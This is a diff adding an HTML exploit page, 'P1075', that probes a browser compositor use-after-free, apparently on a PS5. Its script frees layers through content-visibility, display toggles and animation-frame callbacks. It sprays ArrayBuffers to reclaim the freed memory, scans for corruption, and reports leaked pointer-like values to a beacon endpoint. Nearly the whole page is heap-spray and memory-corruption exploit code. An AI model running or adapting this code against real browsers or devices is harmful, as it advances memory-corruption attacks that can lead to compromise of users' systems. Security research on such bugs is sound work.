@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1075</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}
+#arena{position:fixed;top:-9999px;left:-9999px;width:2000px;height:2000px;overflow:hidden}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1075 — CONTENT-VISIBILITY UAF</div>
+<div class="info">Separated free/use via visibility toggle + spray window</div>
+</div>
+<div id="log"></div>
+<div id="arena"></div>
+
+<script>
+var L=document.getElementById('log'),A=document.getElementById('arena');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m='P1075-'+t+' | '+d;log('info','[B] '+m);try{new Image().src='/en/ps5/beacon.gif?t='+Date.now()+'&m='+encodeURIComponent(m)}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function h8(v){return('0'+v.toString(16)).slice(-2)}
+
+// ============================================================
+// SECTION A: FEATURE DETECTION
+// ============================================================
+async function sectionA() {
+  log('warn','=== A: FEATURE DETECTION ===');
+
+  // A1: content-visibility support
+  var testEl = document.createElement('div');
+  testEl.style.contentVisibility = 'hidden';
+  var cvSupported = (testEl.style.contentVisibility === 'hidden');
+  B('A1-CV', 'supported:'+cvSupported);
+  log(cvSupported?'ok':'fail','[A1] content-visibility: ' + (cvSupported?'YES':'NO'));
+
+  // A2: contain support
+  testEl.style.contain = 'strict';
+  var containSupported = (testEl.style.contain === 'strict');
+  B('A2-CONTAIN', 'strict:'+containSupported);
+  log(containSupported?'ok':'fail','[A2] contain:strict: ' + (containSupported?'YES':'NO'));
+
+  // A3: contain-intrinsic-size
+  testEl.style.containIntrinsicSize = '300px 200px';
+  var cisSupported = testEl.style.containIntrinsicSize !== '';
+  B('A3-CIS', 'supported:'+cisSupported);
+  log(cisSupported?'ok':'fail','[A3] contain-intrinsic-size: ' + (cisSupported?'YES':'NO'));
+
+  // A4: content-visibility:auto (the one that triggers compositor work)
+  testEl.style.contentVisibility = 'auto';
+  var cvAutoSupported = (testEl.style.contentVisibility === 'auto');
+  B('A4-CV-AUTO', 'supported:'+cvAutoSupported);
+  log(cvAutoSupported?'ok':'fail','[A4] content-visibility:auto: ' + (cvAutoSupported?'YES':'NO'));
+
+  return {cv: cvSupported, cvAuto: cvAutoSupported, contain: containSupported};
+}
+
+// ============================================================
+// SECTION B: CONTENT-VISIBILITY CRASH TEST
+// hide → create layers → remove → spray → show → scan
+// ============================================================
+async function sectionB(features) {
+  log('warn','=== B: CV CRASH TEST ===');
+
+  if (!features.cv) {
+    B('B-SKIP', 'no content-visibility');
+    log('fail','[B] Skipping (no content-visibility)');
+    return false;
+  }
+
+  var SIZES=[256,320,384,448,512,640];
+  var N=150;
+
+  for (var round = 0; round < 5; round++) {
+    B('B-ROUND', 'r:'+round);
+
+    // B1: Create container with content-visibility:hidden
+    var c = document.createElement('div');
+    c.style.cssText = 'position:relative;content-visibility:hidden;contain-intrinsic-size:500px 500px';
+    A.appendChild(c);
+
+    // B2: Create compositor layers INSIDE hidden container
+    var layers = [];
+    for (var i = 0; i < 40; i++) {
+      var el = document.createElement('div');
+      el.style.cssText = 'position:absolute;width:30px;height:30px;will-change:transform;transform:translateZ(0);left:'+(i*5)+'px';
+      c.appendChild(el);
+      layers.push(el);
+    }
+    c.offsetHeight; // force layout
+    await sl(30);
+
+    // B3: REMOVE layers while hidden (frees compositor objects without compositor accessing them)
+    for (var i = 0; i < layers.length; i++) {
+      c.removeChild(layers[i]);
+    }
+    layers = null;
+    await sl(10);
+
+    // B4: SPRAY to reclaim freed memory
+    var spray = {}, views = {};
+    for (var si = 0; si < SIZES.length; si++) {
+      var sz = SIZES[si]; spray[sz] = []; views[sz] = [];
+      for (var j = 0; j < N; j++) {
+        var ab = new ArrayBuffer(sz), v = new Uint8Array(ab);
+        // Fill with identifiable pattern: size marker + index + 0xBB sentinel
+        v[0] = si; v[1] = j & 0xFF; v[2] = (j >> 8) & 0xFF; v[3] = round;
+        for (var k = 4; k < sz; k++) v[k] = 0xBB;
+        spray[sz].push(ab); views[sz].push(v);
+      }
+    }
+    await sl(5);
+
+    // B5: SHOW content (forces compositor to re-access layer tree)
+    // If our spray reclaimed a freed layer's memory, compositor reads our data
+    c.style.contentVisibility = 'visible';
+    c.offsetHeight; // force recalc
+    await sl(50);
+
+    // B6: Scan spray for corruption
+    var corrupt = [];
+    for (var si = 0; si < SIZES.length; si++) {
+      var sz = SIZES[si];
+      for (var j = 0; j < N; j++) {
+        var v = views[sz][j]; if (!v) continue;
+        for (var k = 4; k < sz; k++) {
+          if (v[k] !== 0xBB) {
+            var hex = '';
+            for (var h = 0; h < Math.min(64, sz); h++) hex += h8(v[h]);
+            corrupt.push({sz: sz, idx: j, off: k, val: v[k], hex: hex, round: round});
+            break;
+          }
+        }
+      }
+    }
+
+    var msg = 'r:' + round + '|corrupt:' + corrupt.length;
+    if (corrupt.length > 0) {
+      msg += '|sz=' + corrupt[0].sz + ',off=' + corrupt[0].off + ',hex=' + corrupt[0].hex.substring(0, 32);
+      B('B-HIT', msg);
+      log('ok', '*** ROUND ' + round + ': CORRUPTION FOUND! ***');
+      for (var i = 0; i < Math.min(corrupt.length, 3); i++) {
+        var x = corrupt[i];
+        log('ok', '  sz=' + x.sz + ' idx=' + x.idx + ' off=' + x.off + ' hex=' + x.hex.substring(0, 40));
+        B('B-HIT-' + i, 'sz:' + x.sz + '|off:' + x.off + '|hex:' + x.hex);
+        try {
+          var bv = new BigUint64Array(spray[x.sz][x.idx]);
+          var ptrs = '';
+          for (var p = 0; p < Math.min(bv.length, 8); p++) ptrs += p + ':0x' + bv[p].toString(16) + '|';
+          B('B-PTR-' + i, ptrs);
+          log('ok', '  ptrs: ' + ptrs.substring(0, 200));
+        } catch (e) {}
+      }
+      try { A.removeChild(c) } catch(e) {}
+      return true;
+    }
+
+    B('B-CLEAN', msg);
+    log('info', '[B' + round + '] No corruption');
+
+    // Cleanup
+    spray = null; views = null;
+    try { A.removeChild(c) } catch(e) {}
+    await sl(100);
+  }
+
+  return false;
+}
+
+// ============================================================
+// SECTION C: DISPLAY-NONE VARIANT (if content-visibility not available)
+// display:none → create+remove → spray → display:block
+// ============================================================
+async function sectionC() {
+  log('warn','=== C: DISPLAY:NONE VARIANT ===');
+
+  var SIZES=[256,320,384,448,512,640];
+  var N=150;
+
+  for (var round = 0; round < 5; round++) {
+    B('C-ROUND', 'r:'+round);
+
+    var c = document.createElement('div');
+    c.style.cssText = 'position:relative;display:none';
+    A.appendChild(c);
+
+    // Create layers while display:none
+    for (var i = 0; i < 40; i++) {
+      var el = document.createElement('div');
+      el.style.cssText = 'position:absolute;width:30px;height:30px;will-change:transform;transform:translateZ(0)';
+      c.appendChild(el);
+    }
+
+    // Show briefly to force compositor layer creation
+    c.style.display = 'block';
+    c.offsetHeight;
+    await sl(20);
+
+    // Hide again
+    c.style.display = 'none';
+    await sl(10);
+
+    // Remove all children (frees layers while compositor isn't looking)
+    while (c.firstChild) c.removeChild(c.firstChild);
+    await sl(5);
+
+    // Spray
+    var spray = {}, views = {};
+    for (var si = 0; si < SIZES.length; si++) {
+      var sz = SIZES[si]; spray[sz] = []; views[sz] = [];
+      for (var j = 0; j < N; j++) {
+        var ab = new ArrayBuffer(sz), v = new Uint8Array(ab);
+        v[0] = si; v[1] = j & 0xFF; v[2] = (j >> 8) & 0xFF; v[3] = round;
+        for (var k = 4; k < sz; k++) v[k] = 0xCC;
+        spray[sz].push(ab); views[sz].push(v);
+      }
+    }
+    await sl(5);
+
+    // Show to force compositor re-render with freed-but-reclaimed memory
+    c.style.display = 'block';
+    c.offsetHeight;
+    await sl(50);
+
+    // Scan
+    var corrupt = [];
+    for (var si = 0; si < SIZES.length; si++) {
+      var sz = SIZES[si];
+      for (var j = 0; j < N; j++) {
+        var v = views[sz][j]; if (!v) continue;
+        for (var k = 4; k < sz; k++) {
+          if (v[k] !== 0xCC) {
+            var hex = ''; for (var h = 0; h < Math.min(64, sz); h++) hex += h8(v[h]);
+            corrupt.push({sz: sz, idx: j, off: k, val: v[k], hex: hex});
+            break;
+          }
+        }
+      }
+    }
+
+    var msg = 'r:' + round + '|corrupt:' + corrupt.length;
+    if (corrupt.length > 0) {
+      msg += '|sz=' + corrupt[0].sz + ',off=' + corrupt[0].off;
+      B('C-HIT', msg);
+      log('ok', '*** DISPLAY:NONE ROUND ' + round + ': CORRUPTION! ***');
+      for (var i = 0; i < Math.min(corrupt.length, 3); i++) {
+        var x = corrupt[i];
+        B('C-HIT-' + i, 'sz:' + x.sz + '|off:' + x.off + '|hex:' + x.hex);
+        try {
+          var bv = new BigUint64Array(spray[x.sz][x.idx]);
+          var ptrs = '';
+          for (var p = 0; p < Math.min(bv.length, 8); p++) ptrs += p + ':0x' + bv[p].toString(16) + '|';
+          B('C-PTR-' + i, ptrs);
+        } catch (e) {}
+      }
+      try { A.removeChild(c) } catch(e) {}
+      return true;
+    }
+
+    B('C-CLEAN', msg);
+    log('info', '[C' + round + '] No corruption');
+    spray = null; views = null;
+    try { A.removeChild(c) } catch(e) {}
+    await sl(100);
+  }
+  return false;
+}
+
+// ============================================================
+// SECTION D: MUTOBS + RAF WITH IN-CALLBACK SPRAY (refined B2 pattern)
+// Key timing: remove + spray in SAME RAF, compositor uses stale ref AFTER
+// ============================================================
+async function sectionD() {
+  log('warn','=== D: REFINED RAF SPRAY ===');
+
+  var SIZES=[256,320,384,448,512,640];
+  var N=200;
+  var hitData = null;
+
+  // Pre-spray to warm the allocator
+  var warmup = [];
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si];
+    for (var i = 0; i < 50; i++) warmup.push(new ArrayBuffer(sz));
+  }
+  // Free warmup to populate free lists
+  warmup = null;
+  await sl(20);
+
+  // Now create the spray with holes
+  var spray = {}, views = {};
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si]; spray[sz] = []; views[sz] = [];
+    for (var i = 0; i < N; i++) {
+      var ab = new ArrayBuffer(sz), v = new Uint8Array(ab);
+      for (var j = 0; j < sz; j++) v[j] = 0xAA;
+      spray[sz].push(ab); views[sz].push(v);
+    }
+  }
+  // Create holes
+  for (var si = 0; si < SIZES.length; si++) {
+    var sz = SIZES[si];
+    for (var i = 0; i < N; i += 2) { spray[sz][i] = null; views[sz][i] = null; }
+  }
+  // GC pressure
+  for (var gc = 0; gc < 30; gc++) { var t = new ArrayBuffer(65536); t = null; }
+  await sl(30);
+
+  B('D-PREPPED', 'spray ready');
+
+  // 10 rounds of RAF-timed remove+spray
+  for (var round = 0; round < 10; round++) {
+    var c = document.createElement('div');
+    c.style.position = 'relative';
+    A.appendChild(c);
+
+    // Create 20 compositor layers
+    for (var i = 0; i < 20; i++) {
+      var el = document.createElement('div');
+      el.style.cssText = 'position:absolute;width:20px;height:20px;will-change:transform;transform:translateZ(0);background:rgba(0,128,255,0.5);left:'+(i*4)+'px';
+      c.appendChild(el);
+    }
+    c.offsetHeight;
+    await sl(20);
+
+    // Single RAF: remove ALL + spray immediately
+    await new Promise(function(resolve) {
+      requestAnimationFrame(function() {
+        // Remove all children (free layers)
+        while (c.firstChild) c.removeChild(c.firstChild);
+
+        // Immediate spray in same callback
+        for (var si = 0; si < SIZES.length; si++) {
+          var sz = SIZES[si];
+          for (var k = 0; k < 30; k++) {
+            var ab = new ArrayBuffer(sz), v = new Uint8Array(ab);
+            for (var j = 0; j < sz; j++) v[j] = 0xDD;
+            spray[sz].push(ab); views[sz].push(v);
+          }
+        }
+
+        resolve();
+      });
+    });
+
+    await sl(50); // Let compositor run
+
+    // Scan original spray for corruption
+    var corrupt = [];
+    for (var si = 0; si < SIZES.length; si++) {
+      var sz = SIZES[si];
+      for (var i = 1; i < N; i += 2) {
+        var v = views[sz][i]; if (!v) continue;
+        for (var k = 0; k < sz; k++) {
+          if (v[k] !== 0xAA) {
+            var hex = ''; for (var h = 0; h < Math.min(64, sz); h++) hex += h8(v[h]);
+            corrupt.push({sz: sz, idx: i, off: k, val: v[k], hex: hex, round: round});
+            break;
+          }
+        }
+      }
+    }
+
+    // Also scan post-spray
+    for (var si = 0; si < SIZES.length; si++) {
+      var sz = SIZES[si];
+      for (var i = N; i < spray[sz].length; i++) {
+        var v = views[sz][i]; if (!v) continue;
+        for (var k = 0; k < sz; k++) {
+          if (v[k] !== 0xDD) {
+            var hex = ''; for (var h = 0; h < Math.min(64, sz); h++) hex += h8(v[h]);
+            corrupt.push({sz: sz, idx: i, off: k, val: v[k], hex: hex, round: round, post: true});
+            break;
+          }
+        }
+      }
+    }
+
+    if (corrupt.length > 0) {
+      B('D-HIT', 'r:'+round+'|corrupt:'+corrupt.length+'|sz='+corrupt[0].sz+',off='+corrupt[0].off);
+      log('ok', '*** RAF ROUND ' + round + ': CORRUPTION! ***');
+      for (var i = 0; i < Math.min(corrupt.length, 3); i++) {
+        var x = corrupt[i];
+        log('ok','  sz=' + x.sz + ' idx=' + x.idx + ' off=' + x.off + (x.post?' [POST]':''));
+        B('D-HIT-'+i, 'sz:'+x.sz+'|off:'+x.off+'|hex:'+x.hex);
+        try {
+          var ab2 = spray[x.sz][x.idx];
+          if (ab2) {
+            var bv = new BigUint64Array(ab2);
+            var ptrs = ''; for (var p = 0; p < Math.min(bv.length, 8); p++) ptrs += p + ':0x' + bv[p].toString(16) + '|';
+            B('D-PTR-'+i, ptrs);
+            log('ok', '  ptrs: ' + ptrs.substring(0, 200));
+          }
+        } catch(e) {}
+      }
+      hitData = corrupt[0];
+      try { A.removeChild(c) } catch(e) {}
+      break;
+    }
+
+    B('D-CLEAN', 'r:'+round+'|scanned');
+    log('info', '[D' + round + '] Clean');
+    try { A.removeChild(c) } catch(e) {}
+    await sl(50);
+  }
+
+  return hitData !== null;
+}
+
+// ============================================================
+// SECTION E: WEAK REF MONITORING
+// ============================================================
+async function sectionE() {
+  log('warn','=== E: WEAKREF LAYER LIFETIME ===');
+  B('PRE-E','starting');
+
+  var freed = [];
+  var reg = new FinalizationRegistry(function(label) {
+    freed.push({label: label, t: Date.now()});
+    B('E-FREE', label + '|total:' + freed.length);
+  });
+
+  var c = document.createElement('div'); A.appendChild(c);
+
+  // Create elements and register WeakRefs
+  (function() {
+    for (var i = 0; i < 20; i++) {
+      var el = document.createElement('div');
+      el.style.cssText = 'width:20px;height:20px;will-change:transform;transform:translateZ(0)';
+      c.appendChild(el);
+      reg.register(el, 'layer-' + i);
+    }
+  })();
+
+  c.offsetHeight;
+  await sl(30);
+
+  // Remove all
+  while (c.firstChild) c.removeChild(c.firstChild);
+
+  // Apply GC pressure
+  for (var gc = 0; gc < 200; gc++) {
+    var t = new ArrayBuffer(65536); t = null;
+    if (gc % 40 === 0) await sl(10);
+  }
+  await sl(500);
+
+  B('E-RESULT', 'freed:' + freed.length + '/20');
+  log(freed.length > 0 ? 'ok' : 'warn', '[E] ' + freed.length + '/20 elements collected');
+  if (freed.length > 0) {
+    var times = freed.map(function(f) { return f.label }).join(',');
+    B('E-TIMES', times);
+  }
+
+  try { A.removeChild(c) } catch(e) {}
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  B('BOOT', 'cv-uaf-probe');
+  log('ok', '=== P1075: CONTENT-VISIBILITY UAF ===');
+
+  var features = await sectionA();
+  log('ok', '');
+
+  var bHit = await sectionB(features);
+  log('ok', 'B result: ' + (bHit ? 'HIT' : 'clean'));
+
+  var cHit = await sectionC();
+  log('ok', 'C result: ' + (cHit ? 'HIT' : 'clean'));
+
+  var dHit = await sectionD();
+  log('ok', 'D result: ' + (dHit ? 'HIT' : 'clean'));
+
+  await sectionE();
+
+  B('DONE', 'B:'+bHit+'|C:'+cHit+'|D:'+dHit);
+  log('ok', '=== P1075 COMPLETE ===');
+}
+
+run();
+</script>
+</body>
+</html>
